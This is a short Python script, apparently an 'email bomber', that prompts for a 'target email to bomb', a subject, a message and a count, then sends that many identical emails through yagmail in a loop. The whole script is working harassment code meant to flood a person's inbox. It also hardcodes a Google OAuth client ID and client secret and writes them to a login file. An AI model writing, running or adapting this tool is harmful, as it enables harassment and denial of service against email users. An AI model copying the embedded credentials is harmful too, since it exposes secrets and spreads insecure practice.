import yagmail as yg 
import os 
import platform
import sys
oauth_client_secret='''{
  "installed": {
    "client_id": "862726500644-mba83qqf9kq69c5mk9u5h2dn4iocdspq.apps.googleusercontent.com",
    "client_secret":"Hvi-J-wr97hTAh3F_4GMGZIu",
    "redirect_uris": ["https://localhost/"],
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://accounts.google.com/o/oauth2/token"
  }
}'''
if os.path.exists("login.json"):
    accounts=yg.SMTP(oauth2_file="login.json")
else: 
    f=open("login.json","w")
    f.write(oauth_client_secret)
    f.close()
    accounts=yg.SMTP(oauth2_file="login.json")
to=str(input("enter target email to bomb "))
sub=str(input("enter subject "))
msg=str(input("enter message "))
# dd={"to":to,"sub":sub,"msg":msg}
am=int(input("enter amount of msgs to send "))
for i in range (0,am): 
    accounts.send(to=to,subject=sub,contents=msg)
    print (f"{i+1} msgs sent")